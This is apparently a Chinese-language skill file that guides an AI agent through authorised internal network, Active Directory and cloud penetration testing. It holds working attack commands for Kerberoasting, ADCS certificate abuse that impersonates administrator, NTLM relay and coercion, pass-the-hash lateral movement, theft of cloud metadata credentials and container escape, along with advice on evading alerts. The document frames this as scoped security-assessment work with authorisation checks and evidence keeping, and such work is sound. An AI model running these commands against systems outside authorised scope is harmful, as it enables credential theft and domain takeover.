---
name: ad-cloud
description: 【内网/AD/云原生】用于授权范围内的内网渗透、Active Directory 攻击链与云原生环境评估。覆盖域内枚举与 BloodHound 图谱、Kerberoasting / AS-REP、ADCS ESC1-8、NTLM relay、委派滥用、PtH/WMI/WinRM/SMB 横向，以及 AK-SK 泄露、元数据 SSRF、K8s RBAC 与容器逃逸、CI/CD 凭据。判据是拿到可复现的凭据或权限提升证据，不做 Web 漏洞（走 R20）。
---

# 内网 / AD / 云原生作业规范

本 skill 只处理**已授权**的内网与云环境评估。所有动作以"拿到可复现的凭据或权限提升证据"为目标，不做破坏性操作，不横向扩散到授权边界之外。命令与判据细节见 `references/ad-attacks.md`、`references/cloud-native.md`、`references/kerberos-and-adcs.md`、`references/k8s-and-container.md`。

## 适用范围

- 已拿到一个内网 foothold（shell / 跳板机 / 低权账号），要判断能走多远
- 域内枚举、BloodHound 采集与分析、找域管路径
- Kerberoasting、AS-REP Roasting、委派滥用、ADCS 证书攻击
- NTLM relay / 强制认证 / PtH / WMI / WinRM / SMB 横向
- 云上 AK-SK 泄露、实例元数据 SSRF、K8s RBAC 提权、容器逃逸、CI/CD 凭据链
- 需要给出"当前权限 → 目标权限"的可复现路径与证据

不适用：纯 Web 漏洞（SQLi/XSS/SSRF 打应用层、反序列化、文件上传）→ 走 **R20**；纯二进制逆向 → 走 `ida-reverse` / `radare2`；钓鱼与免杀投递不在本 skill 默认范围。

## 前置

### 1. 域信息（先钉住基本盘）

至少确认：域名 / NetBIOS 名、DC 主机名与 IP、DNS、当前账号与权限、已控主机列表、时间同步状态。

```bash
# Linux 侧
nxc smb <DC_IP> -u <user> -p <pass> -d <domain>          # netexec，原 crackmapexec
ldapsearch -x -H ldap://<DC_IP> -D '<user>@<domain>' -w '<pass>' -b 'dc=<domain>,dc=com'
# Windows 侧
whoami /all & echo %USERDNSDOMAIN% & nltest /dsgetdc:<domain>
```

没有域信息时先做只读探测：`nxc smb <网段> -u '' -p ''`、DNS SRV 查询、`nmap -p88,389,445,5985`。**不要**在信息不足时直接开扫全端口或跑重型利用。

### 2. 凭据来源

| 来源 | 典型位置 | 备注 |
|---|---|---|
| 明文口令 | 配置/脚本/聊天记录/环境变量 | 优先验证，注意锁定策略 |
| NTLM hash | SAM/LSASS/NTDS.dit、内存抓取 | PtH 用，不落盘明文 |
| Kerberos 票据 | `.kirbi` / `.ccache` | 注意有效期与时钟 |
| 证书 / PFX | ADCS、用户目录、CI 变量 | 可做 PKINIT / Schannel |
| 云 AK-SK | `.aws/credentials`、环境变量、CI/CD | 先 `sts get-caller-identity` |
| Token | 元数据服务、K8s SA、CI runner | 有 TTL，先记录过期时间 |

**最小验证原则**：每个凭据先做一次低噪音校验（`nxc smb` / `ldapwhoami` / `aws sts get-caller-identity`），确认有效再进入利用链，避免用错凭据触发锁定。

### 3. 可触碰边界

- 授权资产清单（网段、域名、云账号、集群名），清单外一律不碰
- 允许的动作等级：只读枚举 / 凭据验证 / 提权 / 横向 / 持久化，逐级需要明确授权
- 禁做：批量口令喷洒、生产业务中断、删改数据、未授权的持久化与后门、对 EDR/杀软做对抗性卸载
- 速率与时间窗：域内认证失败次数控制在锁定阈值内（默认 ≤3 次/账号），避开业务高峰
- 证据留存：命令、时间、源/目标、返回码、关键输出，统一落到 `evidence/` 并打时间戳

## 一、AD 攻击链

### 1. 枚举与 BloodHound

```bash
# 采集（Linux，需有效域凭据）
bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <DC_IP> -c All --zip
# Windows 侧可用 SharpHound.exe -c All --zipfilename bh.zip
```

关注：到 Domain Admins 的最短路径、Unconstrained/Constrained Delegation、ACL 滥用（GenericAll/WriteDACL/ForceChangePassword）、ADCS 模板、会话与本地管理员复用。**先出图再动手**，避免盲打。

### 2. Kerberoasting / AS-REP

```bash
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile kerb.hash
impacket-GetNPUsers <domain>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile asrep.hash
hashcat -m 13100 kerb.hash wordlist.txt     # Kerberoast
hashcat -m 18200 asrep.hash wordlist.txt    # AS-REP
```

判据：拿到可被离线破解的 hash，且破解出明文或可被 PtH/PKINIT 复用。只拿到 hash 未破解，算"素材"不算"证据"。

### 3. ADCS（ESC1-8）

```bash
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <DC_IP> -vulnerable -stdout
certipy req -u <user>@<domain> -p '<pass>' -ca <CA> -template <Tpl> -upn administrator@<domain> -dc-ip <DC_IP>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

ESC1（模板允许任意 SAN + 低权注册）、ESC2（Any Purpose）、ESC3（注册代理）、ESC4（模板 ACL 可写）、ESC5（PKI 对象 ACL）、ESC6（编辑 flag）、ESC7（CA 权限）、ESC8（HTTP 端点 NTLM relay）。详细区分与利用见 reference。

### 4. NTLM relay 与强制认证

```bash
# 关闭 SMB 签名的主机上做 relay
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
# 触发强制认证（需授权）
responder -I eth0 -wv          # 仅监听，不做 poisoning 时先确认授权
petitpotam.py <listener_ip> <target_ip>
```

先确认目标未开 SMB signing / LDAP signing / EPA，否则 relay 必然失败。优先打 ADCS HTTP 端点（ESC8）。

### 5. 委派

- Unconstrained：拿到主机本地管理员即可窃取 TGT（`Rubeus monitor` / `sekurlsa`）
- Constrained：`impacket-getST -spn <spn> -impersonate administrator`
- RBCD：写目标 `msDS-AllowedToActOnBehalfOfOtherIdentity`，再 S4U2Self/S4U2Proxy

### 6. 横向（PtH / WMI / WinRM / SMB）

```bash
nxc smb <target> -u <user> -H <ntlm> -d <domain> --shares
nxc wmi <target> -u <user> -H <ntlm> -d <domain> -x 'whoami'
nxc winrm <target> -u <user> -H <ntlm> -d <domain> -x 'whoami'
impacket-psexec <domain>/<user>@<target> -hashes :<ntlm>
impacket-wmiexec <domain>/<user>@<target> -hashes :<ntlm>
```

优先级：WinRM（5985/5986）> WMI > SMB > psexec（最吵，最后用）。每次成功后立即记录主机、账号、权限级别与时间。

## 二、云原生

### 1. AK-SK 泄露利用

```bash
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
# 只读快查：枚举可访问的资源
aws s3 ls; aws ec2 describe-instances --max-items 5
```

先判定身份与权限面，再决定是提权、横向到其他账号，还是拿数据证据。**不要**直接批量导出对象存储。

### 2. 元数据 SSRF

```bash
curl -s -H 'X-aws-ec2-metadata-token: <token>' http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google'
```

先拿 IMDSv2 token（`PUT /latest/api/token`），再取角色临时凭据；GCP/Azure 对应 endpoint 不同。判据是拿到可用的临时 AK-SK-SessionToken 并成功调用 `sts get-caller-identity`。

### 3. K8s RBAC 与逃逸

```bash
kubectl auth can-i --list
kubectl get clusterrolebinding -o wide
kubectl auth can-i create pods --as=system:serviceaccount:<ns>:<sa>
```

关注：`create pods` / `create daemonsets` / `get secrets` / `impersonate` / `bind` / `escalate`。有 `create pods` 即可挂宿主路径逃逸；有 `get secrets` 即可拿 SA token 横向。

### 4. 容器逃逸

- privileged + `CAP_SYS_ADMIN`：挂宿主 `/` 或 `nsenter`
- `hostPath` 挂载 `/var/run/docker.sock` / `/run/containerd/containerd.sock`：起特权容器
- `hostPID` + `nsenter -t 1 -m -u -i -n -p`；内核漏洞 / cgroup release_agent / `CAP_SYS_PTRACE` 注入宿主进程

判据：在宿主命名空间执行 `id` 或读到宿主文件系统，且能给出复现命令。

### 5. CI/CD 凭据

检查：流水线环境变量、runner 上的 `~/.aws`、`~/.docker/config.json`、`GITHUB_TOKEN` / `CI_JOB_TOKEN`、制品仓库凭据、签名密钥。重点判断 token 的 scope 与是否可跨仓库/跨环境提权。

## 判据（什么算"打穿"）

同时满足三条才算有效结论，缺一条只能写"待验证"：

1. **凭据可复现**：给出完整的获取命令/路径与返回，换一台干净机器照做仍能得到同一凭据或同一权限。
2. **权限提升可见证**：`whoami /all`、`kubectl auth can-i`、`aws sts get-caller-identity`、域管组成员等**客观输出**证明权限级别发生变化。
3. **证据可归档**：命令、时间戳、源/目标、原始输出、hash/证书/票据的指纹（不回传明文敏感数据），能支撑报告复现。

## 失败判据（必须降级为「未验证」）

出现以下任一情况，这条路已走不通：结论只能写「未验证」，并转到括注的替代路线：

- 认证侧根本进不去：`KRB_AP_ERR_SKEW` 对时后仍失败、`STATUS_ACCOUNT_LOCKED_OUT`、或同一账号连续 2 次 4625 → 停，换账号/换来源，别再撞锁定阈值。
- 只有 hash/票据/证书、没有明文或可用会话（Kerberoast 仅 AES 且字典不中、ADCS 只拿到 pfx 未 `certipy auth` 成功）→ 是「素材」不是「打穿」，转 ADCS/委派或如实记录。
- `certipy find` 报 vulnerable 但当前账号无 `Enroll`、模板需 manager approval、CA 拒绝 SAN → 别在 ESC1/ESC6 上反复试，转 ESC4/ESC5/ESC7（需 ACL 或 CA 权限）。
- relay 侧全堵：SMB/LDAP signing 强制、EPA 已开、目标只收 Kerberos → 放弃 relay，转凭据直连或 ADCS HTTP 之外的面。
- 委派不可用：`msDS-AllowedToDelegateTo` 不含目标、SPN 不匹配、目标禁用协议转换、无 RBCD 写权限 → 转 ACL 滥用（`ad-attacks.md`）或横向凭据复用。
- 云侧身份无效：`aws sts get-caller-identity` 报 AccessDenied/ExpiredToken，元数据端点 403/超时，或凭据只有 `List*` 无可利用写权限 → 记录权限面后转其他凭据来源。
- 集群侧权限不足：`kubectl auth can-i` 均为 no、`create pods` 被 PSA/Quota 拦、逃逸缺 `CAP_SYS_ADMIN` 或挂载只读 → 停手，转 Secret/CI 凭据面，不再反复提权。
- 连续两次同一手法失败（同工具同参数、同目标同入口）→ 换路线或汇报，不堆时间。

## 工具与降级

| 工具 | 用途 | 缺失时 |
|---|---|---|
| `impacket-*` | GetUserSPNs / GetNPUsers / getST / psexec / wmiexec / ntlmrelayx | `pipx install impacket`；或改走 `nxc` 对应模块 |
| `certipy` | ADCS 枚举与利用 | `pipx install certipy-ad`；或 `certipy find` 的手工 LDAP 替代 |
| `bloodhound-python` / SharpHound | AD 图谱采集 | 无采集器时用 `ldapsearch` + `nxc` 手工拼关键关系 |
| `Rubeus` | 票据申请/导入/委派 | Linux 侧用 `impacket-getST` / `getTGT` 替代 |
| `nxc`（netexec） | SMB/LDAP/WMI/WinRM 一把梭 | 退回 `smbclient` / `wmiexec` / `evil-winrm` |
| `kubectl` | K8s 枚举与利用 | 直接用 API Server + SA token `curl` |
| `awscli` | 云身份与资源枚举 | `curl` 调 STS/IAM API（SigV4 手签） |
| `trivy` | 镜像/配置漏洞与密钥扫描 | `grype` / `syft`；或手工查 Dockerfile 与镜像层 |

环境里没有对应工具时**不要现场编造命令**：先 `pipx`/包管理器安装并在报告注明版本；仍不可用时走 `powershell -File Tool/scripts/tool-run.ps1 -Tool <tool-id>`（`-ListModes` 查通道），最后降级为只读手工枚举 + 证据记录。

## 坑

1. **账号锁定**：域默认锁定阈值常见 5 次，实际按 3 次控制。喷洒前先 `nxc smb --pass-pol` 读策略；同一账号失败 2 次即停，换账号或换来源。
2. **触发告警**：Kerberoasting 的 RC4 TGS 请求、大量 4625、`ntlmrelayx` 的 SMB 连接、`psexec` 的服务创建（7045）都是高保真告警。控制速率、错峰、优先用已有凭据而非爆破。
3. **时钟偏移**：Kerberos 默认容忍 5 分钟。容器/跳板机时间漂移会导致 `KRB_AP_ERR_SKEW`，先 `chronyc tracking` / `w32tm /stripchart` 对齐再申请票据。
4. **云审计日志**：CloudTrail / GuardDuty / Azure Activity Log / K8s audit 会记录 `GetSecretValue`、`AssumeRole`、`create pods`、`exec`。优先用只读 API、避免批量列举；所有调用记录时间以便与告警对齐。
5. **票据/令牌过期**：TGT 默认 10 小时、云临时凭据通常 1 小时、SA token 可能绑定 Pod 生命周期。拿到就记录到期时间，别在报告里把过期凭据当有效证据。
6. **NTLM relay 失败**：多半是 SMB/LDAP signing 或 EPA 已启用，或目标强制 SMBv3 加密。先验证再投入时间。
7. **ADCS 误判**：`certipy find` 报 vulnerable 不等于可利用，要确认当前账号对模板有 Enroll 权限、CA 允许 SAN、且没有 manager approval。
8. **容器逃逸后误伤**：挂宿主根目录只读优先；`nsenter` 前确认 PID 命名空间；不要在宿主上装工具或改配置。

## 验收

- [ ] 授权边界文档在案，所有动作未越界
- [ ] 每条结论都有"命令 + 输出 + 时间 + 源/目标"
- [ ] 凭据类证据给出获取路径与可复现步骤，敏感值做脱敏/指纹化
- [ ] 提权类证据给出前后对比（权限、组成员、`auth can-i` 结果）
- [ ] 明确标注失败路径与失败原因（如 signing 已开、模板需审批）
- [ ] 未在目标上遗留持久化、计划任务、后门账号（除非单独授权）
- [ ] 风险与修复建议分开写，不把"能打穿"直接等同于"必须立刻修"
- [ ] `json`/脚本类产物做过语法校验，路径与仓库约定一致

## 边界

- **不做 Web 漏洞**：SQLi、XSS、SSRF 打应用层、反序列化、文件上传、越权接口等一律走 **R20**。本 skill 只在"已拿到 foothold 或云凭据"之后接手。
- 不做未授权的钓鱼、免杀、供应链投毒、对生产业务的拒绝服务。
- 不绕过客户明确声明的 EDR/审计要求；不删除或篡改日志。
- 不把内网/云环境中的真实用户数据带出授权范围；证据中的口令、hash、AK-SK 一律脱敏。
- 不默认做持久化；持久化必须单独授权并登记清理方式。
- 云上不碰授权账号之外的资源，不创建计费资源，不修改 IAM 策略（除非授权且已备份）。
